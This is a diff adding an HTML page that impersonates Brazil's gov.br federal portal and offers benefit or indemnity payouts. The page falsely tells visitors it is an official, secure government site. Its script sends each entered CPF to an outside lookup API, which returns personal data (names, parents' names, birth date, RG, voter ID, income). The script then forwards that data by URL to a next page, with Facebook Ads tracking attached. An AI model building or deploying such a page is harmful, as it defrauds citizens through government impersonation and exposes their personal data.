@@ -1,0 +1,713 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="images/Gov.br_logo.svg.png">
+    <link rel="shortcut icon" type="image/png" href="images/Gov.br_logo.svg.png">
+    
+    <!-- UTMify Pixel Code -->
+  <script>
+  window.googlePixelId = "69702546258311df42737496";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script>
+    <!-- End UTMify Pixel Code -->
+    
+    <!-- UTM Capture and Preservation System -->
+    <script>
+      // Sistema de captura e preservação de UTMs do Facebook Ads
+      (function() {
+        // Função para capturar UTMs da URL
+        function captureUTMs() {
+          const urlParams = new URLSearchParams(window.location.search);
+          const utmParams = {
+            utm_source: urlParams.get('utm_source'),
+            utm_campaign: urlParams.get('utm_campaign'),
+            utm_medium: urlParams.get('utm_medium'),
+            utm_content: urlParams.get('utm_content'),
+            utm_term: urlParams.get('utm_term')
+          };
+          
+          // Verificar se há UTMs válidas
+          const hasUTMs = Object.values(utmParams).some(value => value && value !== '');
+          
+          if (hasUTMs) {
+            console.log('🎯 UTMs capturadas:', utmParams);
+            
+            // Salvar UTMs no localStorage para persistência
+            localStorage.setItem('energia_utm_data', JSON.stringify(utmParams));
+            
+            // Salvar também no sessionStorage para uso imediato
+            sessionStorage.setItem('energia_utm_data', JSON.stringify(utmParams));
+            
+            // Adicionar UTMs à URL atual se não estiverem presentes
+            addUTMsToCurrentURL(utmParams);
+            
+            return utmParams;
+          } else {
+            // Tentar recuperar UTMs salvas
+            const savedUTMs = localStorage.getItem('energia_utm_data');
+            if (savedUTMs) {
+              const parsedUTMs = JSON.parse(savedUTMs);
+              console.log('🔄 UTMs recuperadas do localStorage:', parsedUTMs);
+              
+              // Adicionar UTMs recuperadas à URL atual
+              addUTMsToCurrentURL(parsedUTMs);
+              
+              return parsedUTMs;
+            }
+          }
+          
+          return null;
+        }
+        
+        // Função para adicionar UTMs à URL atual
+        function addUTMsToCurrentURL(utmParams) {
+          const currentURL = new URL(window.location.href);
+          let hasChanges = false;
+          
+          Object.entries(utmParams).forEach(([key, value]) => {
+            if (value && !currentURL.searchParams.has(key)) {
+              currentURL.searchParams.set(key, value);
+              hasChanges = true;
+            }
+          });
+          
+          if (hasChanges) {
+            // Atualizar URL sem recarregar a página
+            window.history.replaceState({}, '', currentURL.toString());
+            console.log('🔗 URL atualizada com UTMs:', currentURL.toString());
+          }
+        }
+        
+        // Função para obter UTMs atuais
+        window.getCurrentUTMs = function() {
+          const savedUTMs = localStorage.getItem('energia_utm_data');
+          return savedUTMs ? JSON.parse(savedUTMs) : null;
+        };
+        
+        // Função para adicionar UTMs a qualquer URL
+        window.addUTMsToURL = function(url) {
+          const utmData = window.getCurrentUTMs();
+          if (!utmData) return url;
+          
+          const urlObj = new URL(url, window.location.origin);
+          Object.entries(utmData).forEach(([key, value]) => {
+            if (value) {
+              urlObj.searchParams.set(key, value);
+            }
+          });
+          
+          return urlObj.toString();
+        };
+        
+        // Função para navegar mantendo UTMs
+        window.navigateWithUTMs = function(url) {
+          const urlWithUTMs = window.addUTMsToURL(url);
+          window.location.href = urlWithUTMs;
+        };
+        
+        // Executar captura quando a página carregar
+        document.addEventListener('DOMContentLoaded', function() {
+          const capturedUTMs = captureUTMs();
+          
+          if (capturedUTMs) {
+            console.log('✅ Sistema de UTMs ativo:', capturedUTMs);
+          } else {
+            console.log('ℹ️ Nenhuma UTM detectada');
+          }
+        });
+        
+        // Capturar UTMs imediatamente se a página já carregou
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', captureUTMs);
+        } else {
+          captureUTMs();
+        }
+      })();
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="css2-1.html" rel="stylesheet">
+    <link rel="stylesheet" href="bootstrap.css">
+    <link rel="stylesheet" href="app.css">
+    <link rel="stylesheet" href="blue.css">
+    <link rel="stylesheet" href="css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <link rel="icon" type="image/x-icon" href="images/Gov.br_logo.svg.png">
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- User Data Manager -->
+    <script src="js/user-data-manager.js"></script>
+    <title>Portal Gov - Luz Acessível para Todos</title>
+
+    <style>
+      body {
+        font-family: "Roboto", sans-serif;
+        background-color: #f8f9fa;
+        margin: 0;
+        padding: 0;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+
+      header {
+        background-color: #ffffff;
+        border-bottom: 1px solid #e5e7eb;
+        padding: 15px 30px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      }
+
+      .header-container {
+        max-width: 1200px;
+        margin: 0 auto;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+
+      header img {
+        max-height: 50px;
+        object-fit: contain;
+      }
+
+      .accessibility-links {
+        display: flex;
+        gap: 20px;
+        font-size: 14px;
+      }
+
+      .accessibility-links div {
+        padding: 8px 12px;
+        cursor: pointer;
+        transition: background-color 0.3s;
+        border-radius: 6px;
+        display: flex;
+        align-items: center;
+        color: #333;
+        font-weight: 500;
+      }
+
+      .accessibility-links div:hover {
+        background-color: #e6f3ff;
+        color: #0066cc;
+      }
+
+      .accessibility-links div i {
+        margin-right: 8px;
+        color: #0066cc;
+      }
+
+      main {
+        flex: 1;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+      }
+
+      .login-container {
+        background: #ffffff;
+        border-radius: 12px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        overflow: hidden;
+        max-width: 500px;
+        width: 100%;
+        display: flex;
+        min-height: 400px;
+      }
+
+      .login-form {
+        flex: 1;
+        padding: 40px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+      }
+
+      .login-form h5 {
+        color: #333;
+        font-weight: 700;
+        font-size: 24px;
+        margin-bottom: 30px;
+        text-align: center;
+      }
+
+      .cpf-section {
+        margin-bottom: 30px;
+      }
+
+      .cpf-section .icon-text {
+        display: flex;
+        align-items: center;
+        margin-bottom: 10px;
+        color: #0066cc;
+        font-weight: 500;
+      }
+
+      .cpf-section .icon-text i {
+        margin-right: 12px;
+        font-size: 18px;
+      }
+
+      .cpf-description {
+        color: #666;
+        font-size: 14px;
+        margin-bottom: 20px;
+        line-height: 1.4;
+      }
+
+      .form-group {
+        margin-bottom: 20px;
+      }
+
+      .form-group label {
+        display: block;
+        margin-bottom: 8px;
+        color: #333;
+        font-weight: 600;
+        font-size: 14px;
+      }
+
+      .form-control {
+        width: 100%;
+        padding: 12px 16px;
+        border: 2px solid #ddd;
+        border-radius: 8px;
+        font-size: 16px;
+        transition: border-color 0.3s;
+        box-sizing: border-box;
+      }
+
+      .form-control:focus {
+        outline: none;
+        border-color: #0066cc;
+        box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
+      }
+
+      .btn-cta {
+        background: linear-gradient(135deg, #0066cc, #0052a3);
+        color: white;
+        border: none;
+        padding: 14px 30px;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s;
+        width: 100%;
+        margin-top: 10px;
+      }
+
+      .btn-cta:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 4px 12px rgba(0, 102, 204, 0.3);
+      }
+
+      .btn-cta:disabled {
+        background: #ccc;
+        cursor: not-allowed;
+        transform: none;
+        box-shadow: none;
+      }
+
+      .other-options {
+        margin-top: 30px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+      }
+
+      .other-options h5 {
+        font-size: 16px;
+        margin-bottom: 20px;
+        color: #333;
+      }
+
+      .other-options ul {
+        list-style: none;
+        padding: 0;
+        margin: 0;
+      }
+
+      .other-options li {
+        display: flex;
+        align-items: center;
+        padding: 12px 0;
+        color: #666;
+        cursor: pointer;
+        transition: color 0.3s;
+      }
+
+      .other-options li:hover {
+        color: #0066cc;
+      }
+
+      .other-options li i {
+        margin-right: 15px;
+        color: #0066cc;
+        width: 20px;
+        text-align: center;
+      }
+
+      .help-section {
+        text-align: center;
+        margin-top: 30px;
+        padding-top: 20px;
+        border-top: 1px solid #eee;
+      }
+
+      .help-section div {
+        margin: 10px 0;
+        color: #0066cc;
+        cursor: pointer;
+        font-size: 14px;
+      }
+
+      .help-section div:hover {
+        text-decoration: underline;
+      }
+
+      footer {
+        background-color: #f8f9fa;
+        text-align: center;
+        padding: 30px 20px;
+        color: #6c757d;
+        font-size: 14px;
+        border-top: 1px solid #e9ecef;
+        margin-top: auto;
+      }
+
+      footer p {
+        margin: 0;
+        line-height: 1.5;
+      }
+
+      footer strong {
+        color: #495057;
+      }
+
+      @media (max-width: 768px) {
+        .login-container {
+          margin: 10px;
+        }
+
+        .login-form {
+          padding: 30px 20px;
+        }
+
+        .header-container {
+          flex-direction: column;
+          gap: 15px;
+        }
+
+        .accessibility-links {
+          justify-content: center;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .login-form {
+          padding: 20px 15px;
+        }
+
+        .login-form h5 {
+          font-size: 20px;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <header class="bg-white shadow-sm"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8"><div class="flex justify-between items-center h-16"><div class="flex items-center"><img alt="gov.br" fetchpriority="high" width="120" height="40" decoding="async" data-nimg="1" class="h-8 w-auto" src="images/Gov.br_logo.svg.png" style=""></div><div class="flex items-center gap-4"><div class="flex items-center gap-2 text-sm text-gray-600"><span>PT</span><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20" aria-hidden="true"><path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg></div><div class="relative"><button id="profile-button" class="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center hover:bg-blue-700 transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2" aria-label="Perfil do usuário" aria-expanded="false"><svg class="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20" aria-hidden="true"><path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path></svg></button><div id="profile-dropdown" class="absolute right-0 top-full mt-2 w-72 bg-white rounded-lg shadow-lg border border-gray-200 p-4 z-50 hidden" bis_skin_checked="1"><div class="absolute -top-2 right-4 w-4 h-4 bg-white border-l border-t border-gray-200 transform rotate-45" bis_skin_checked="1"></div><div class="flex items-start gap-3" bis_skin_checked="1"><div class="w-10 h-10 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0" bis_skin_checked="1"><svg class="w-5 h-5 text-blue-600" fill="currentColor" viewBox="0 0 20 20" aria-hidden="true"><path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path></svg></div><div class="flex-1" bis_skin_checked="1"><h3 class="font-semibold text-gray-900 mb-1">Acesso à Conta</h3><p class="text-sm text-gray-600 mb-3">Para acessar sua conta gov.br, informe seu CPF no formulário abaixo.</p><div class="flex items-center gap-2 text-xs text-blue-600" bis_skin_checked="1"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20" aria-hidden="true"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"></path></svg><span>Ambiente seguro e oficial</span></div></div></div><div class="mt-4 pt-3 border-t border-gray-100" bis_skin_checked="1"><button class="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded-md text-sm font-medium transition-colors">Inserir CPF</button></div></div></div></div></div></div></header>
+
+    <nav class="bg-blue-600 text-white py-2" aria-label="Breadcrumb"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8" bis_skin_checked="1"><ol class="flex text-sm"><li>Benefício</li><li class="mx-2" aria-hidden="true">></li><li>Indenização</li><li class="mx-2" aria-hidden="true">></li><li aria-current="page">Usuário GOV.BR</li></ol></div></nav>
+
+    <section class="relative bg-gradient-to-r from-blue-600 to-blue-800 text-white"><div class="absolute inset-0 bg-black opacity-20" bis_skin_checked="1"></div><div class="relative bg-cover bg-center py-20" bis_skin_checked="1" style="background-image: url('./gov-br-hero-mobile.webp'); background-blend-mode: overlay;"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center" bis_skin_checked="1"><h1 class="text-3xl md:text-5xl font-bold mb-4">Portal Oficial do Governo Federal</h1><p class="text-lg md:text-xl mb-8 max-w-3xl mx-auto">Acesse seus benefícios e serviços de forma segura e gratuita. Consulte valores disponíveis para saque e indenizações.</p><div class="flex flex-col sm:flex-row gap-4 justify-center items-center" bis_skin_checked="1"><div class="flex items-center gap-2 text-sm" bis_skin_checked="1"><svg class="w-5 h-5 text-green-400" fill="currentColor" viewBox="0 0 20 20" aria-hidden="true"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg><span>100% Seguro</span></div><div class="flex items-center gap-2 text-sm" bis_skin_checked="1"><svg class="w-5 h-5 text-green-400" fill="currentColor" viewBox="0 0 20 20" aria-hidden="true"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg><span>Gratuito</span></div><div class="flex items-center gap-2 text-sm" bis_skin_checked="1"><svg class="w-5 h-5 text-green-400" fill="currentColor" viewBox="0 0 20 20" aria-hidden="true"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg><span>Oficial</span></div></div></div></div></section>
+
+    <main>
+      <div class="login-container">
+        <div class="login-form">
+          <h5>Identifique-se no gov.br</h5>
+
+          <div class="cpf-section">
+            <div class="icon-text">
+              <i class="fas fa-id-card"></i>
+              <span>Número do CPF</span>
+            </div>
+            <div class="cpf-description">
+              Digite seu CPF para <strong>criar</strong> ou
+              <strong>acessar</strong> sua conta gov.br
+            </div>
+
+            <form class="w-100" id="cpf-form">
+              <div class="form-group">
+                <label for="cpf">CPF</label>
+                <input name="cpf" id="cpf" type="text" class="form-control" value="" inputmode="numeric" pattern="[0-9]*" maxlength="14" autocomplete="off" placeholder="000.000.000-00" onkeyup="formatCpf(this)">
+              </div>
+
+              <button type="button" id="btn-consultar" class="btn-cta">
+                Continuar
+              </button>
+            </form>
+          </div>
+
+          <div class="other-options">
+            <h5>Outras opções de identificação:</h5>
+            <ul>
+              <li>
+                <i class="fas fa-mobile-alt"></i>
+                <span>Login com o seu banco</span>
+              </li>
+              <li>
+                <i class="fas fa-qrcode"></i>
+                <span>Login com QR code</span>
+              </li>
+              <li>
+                <i class="fas fa-certificate"></i>
+                <span>Seu certificado digital</span>
+              </li>
+              <li>
+                <i class="fas fa-cloud"></i>
+                <span>Seu certificado digital em nuvem</span>
+              </li>
+            </ul>
+          </div>
+
+          <div class="help-section">
+            <div>
+              <i class="fas fa-question-circle"></i>
+              Está com dúvidas e precisa de ajuda?
+            </div>
+            <div>Termo de Uso e Aviso de Privacidade</div>
+          </div>
+
+          <div class="mt-6 sm:mt-8 p-3 sm:p-4 bg-blue-50 border border-blue-200 rounded-lg" bis_skin_checked="1"><div class="flex items-center gap-2 mb-2" bis_skin_checked="1"><svg class="w-5 h-5 text-blue-600" fill="currentColor" viewBox="0 0 20 20" aria-hidden="true"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg><h3 class="font-semibold text-blue-800">Ambiente Seguro</h3></div><p class="text-blue-700 text-sm">Este é o portal oficial do governo federal. Seus dados estão protegidos e a consulta é gratuita.</p></div>
+        </div>
+      </div>
+    </main>
+
+    <footer>
+      <p>
+        © 2025 <strong>Governo Federal</strong>. Todos os direitos reservados.
+      </p>
+    </footer>
+
+    <script>
+      // Profile dropdown functionality
+      document.addEventListener("DOMContentLoaded", function() {
+        const profileButton = document.getElementById("profile-button");
+        const profileDropdown = document.getElementById("profile-dropdown");
+        
+        if (profileButton && profileDropdown) {
+          profileButton.addEventListener("click", function(e) {
+            e.stopPropagation();
+            const isVisible = !profileDropdown.classList.contains("hidden");
+            
+            if (isVisible) {
+              profileDropdown.classList.add("hidden");
+              profileButton.setAttribute("aria-expanded", "false");
+            } else {
+              profileDropdown.classList.remove("hidden");
+              profileButton.setAttribute("aria-expanded", "true");
+            }
+          });
+          
+          // Close dropdown when clicking outside
+          document.addEventListener("click", function(e) {
+            if (!profileButton.contains(e.target) && !profileDropdown.contains(e.target)) {
+              profileDropdown.classList.add("hidden");
+              profileButton.setAttribute("aria-expanded", "false");
+            }
+          });
+          
+          // Close dropdown when pressing Escape
+          document.addEventListener("keydown", function(e) {
+            if (e.key === "Escape") {
+              profileDropdown.classList.add("hidden");
+              profileButton.setAttribute("aria-expanded", "false");
+            }
+          });
+        }
+      });
+
+      /**
+       * Applies formatting mask to CPF
+       * @param {Element} element - The CPF input element
+       */
+      function formatCpf(element) {
+        let cpf = element.value.replace(/\D/g, "");
+        cpf = cpf.substring(0, 11);
+        cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
+        cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
+        cpf = cpf.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+        element.value = cpf;
+      }
+
+      // Garantir que o código execute quando o documento estiver carregado
+      document.addEventListener("DOMContentLoaded", function () {
+        const btnConsultar = document.getElementById("btn-consultar");
+
+        btnConsultar.addEventListener("click", async function () {
+          // Get the CPF and remove non-numeric characters
+          const cpfInput = document.getElementById("cpf");
+          let cpf = cpfInput.value.replace(/\D/g, "");
+
+          // Validação mínima de formato (apenas se tem 11 dígitos)
+          if (cpf.length !== 11) {
+            alert("Por favor, digite um CPF com 11 dígitos.");
+            return;
+          }
+
+          // Mostrar loading
+          btnConsultar.disabled = true;
+          btnConsultar.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Consultando...';
+
+          try {
+            // Format CPF for API call (with dots and dash)
+            const cpfFormatado = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+
+            // URL da API externa (substituindo o uso do PHP)
+            const token = "0599";
+            const apiUrl = `https://searchapi.dnnl.live/consulta?token_api=${token}&cpf=${cpf}`;
+
+            console.log('🔍 Consultando API externa:', apiUrl);
+
+            const response = await fetch(apiUrl, {
+              method: "GET",
+              headers: {
+                "Accept": "application/json",
+                "Content-Type": "application/json",
+              },
+            });
+
+            const data = await response.json();
+            console.log('📊 Resposta da API completa:', data);
+            console.log('📊 Status:', data.status);
+            console.log('📊 Dados array:', data.dados);
+            console.log('📊 Tamanho do array:', data.dados ? data.dados.length : 0);
+
+            if (data.dados && data.dados.length > 0) {
+              // CPF found in database - pegar o primeiro resultado do array
+              const apiData = data.dados[0];
+              console.log('📊 Dados do primeiro registro:', apiData);
+              
+              // Mapear campos da API para o formato esperado
+              const userData = {
+                cpf: apiData.CPF,
+                nome: apiData.NOME,
+                nascimento: apiData.NASC,
+                sexo: apiData.SEXO,
+                renda: apiData.RENDA,
+                mae: apiData.NOME_MAE,
+                nomePai: apiData.NOME_PAI,
+                rg: apiData.RG,
+                tituloEleitor: apiData.TITULO_ELEITOR,
+                ufEmissao: apiData.UF_EMISSAO,
+                orgaoEmissor: apiData.ORGAO_EMISSOR,
+                estadoCivil: null,
+                endereco: null,
+                telefone: null
+              };
+
+              // Função para capitalizar nomes (primeira letra maiúscula, resto minúsculo)
+              const capitalizarNome = (nome) => {
+                if (!nome) return null;
+                return nome.toLowerCase().split(' ').map(palavra => 
+                  palavra.charAt(0).toUpperCase() + palavra.slice(1)
+                ).join(' ');
+              };
+
+              // Store user data in sessionStorage for next page
+              sessionStorage.setItem("userData", JSON.stringify({
+                cpf: userData.cpf,
+                nome: capitalizarNome(userData.nome),
+                nomeCompleto: capitalizarNome(userData.nome),
+                nascimento: userData.nascimento,
+                sexo: userData.sexo,
+                renda: userData.renda || null,
+                nomeMae: capitalizarNome(userData.mae),
+                estadoCivil: userData.estadoCivil || null,
+                endereco: userData.endereco || null,
+                telefone: userData.telefone || null,
+                rg: userData.rg || null,
+                tituloEleitor: userData.tituloEleitor || null,
+                ufEmissao: userData.ufEmissao || null,
+                orgaoEmissor: userData.orgaoEmissor || null,
+                nomePai: userData.nomePai || null,
+                _rawData: userData
+              }));
+
+              console.log('✅ Dados do usuário salvos:', userData);
+
+              // Show success message
+              btnConsultar.innerHTML = '<i class="fas fa-check"></i> CPF Validado!';
+
+              // Redirect after a short delay
+              setTimeout(function () {
+                // 🔗 PASSAR DADOS VIA URL PARA GARANTIR PROPAGAÇÃO
+                const userDataForURL = {
+                  cpf: userData.cpf,
+                  nome: capitalizarNome(userData.nome),
+                  nomeCompleto: capitalizarNome(userData.nome),
+                  nascimento: userData.nascimento,
+                  nomeMae: capitalizarNome(userData.mae),
+                  estadoCivil: userData.estadoCivil || null
+                };
+                
+                // Construir URL com dados
+                const params = new URLSearchParams();
+                
+                // Adicionar dados do usuário
+                if (userDataForURL.nome) params.set('nome', userDataForURL.nome);
+                if (userDataForURL.cpf) params.set('cpf', userDataForURL.cpf);
+                if (userDataForURL.nascimento) params.set('nascimento', userDataForURL.nascimento);
+                if (userDataForURL.nomeMae) params.set('nomeMae', userDataForURL.nomeMae);
+                if (userDataForURL.estadoCivil) params.set('estadoCivil', userDataForURL.estadoCivil);
+                if (userDataForURL.nomeCompleto) params.set('nomeCompleto', userDataForURL.nomeCompleto);
+                
+                // Adicionar UTMs se existirem
+                const utmData = window.getCurrentUTMs ? window.getCurrentUTMs() : null;
+                if (utmData) {
+                  Object.entries(utmData).forEach(([key, value]) => {
+                    if (value) params.set(key, value);
+                  });
+                }
+                
+                const targetURL = params.toString() ? 
+                  `./energia?${params.toString()}` : 
+                  './energia';
+                
+                console.log('🚀 Redirecionando para:', targetURL);
+                console.log('📋 Dados sendo enviados via URL:', Object.fromEntries(params));
+                
+                window.location.href = targetURL;
+              }, 1000);
+            } else {
+              // CPF not found or invalid
+              btnConsultar.disabled = false;
+              btnConsultar.innerHTML = "Continuar";
+              
+              console.error('❌ Erro na validação dos dados:');
+              console.error('Status da resposta:', data.status);
+              console.error('Dados recebidos:', data.dados);
+              console.error('Array vazio?', !data.dados || data.dados.length === 0);
+              console.error('Resposta completa:', JSON.stringify(data, null, 2));
+              alert("CPF não encontrado na base de dados. Verifique se o número está correto ou tente novamente mais tarde.");
+            }
+          } catch (error) {
+            console.error("❌ Erro ao consultar CPF:", error);
+
+            // In case of API error, show error message
+            btnConsultar.disabled = false;
+            btnConsultar.innerHTML = "Continuar";
+            alert("Erro ao consultar CPF. Verifique sua conexão e tente novamente.");
+          }
+        });
+      });
+    </script>
+  
+</body></html>
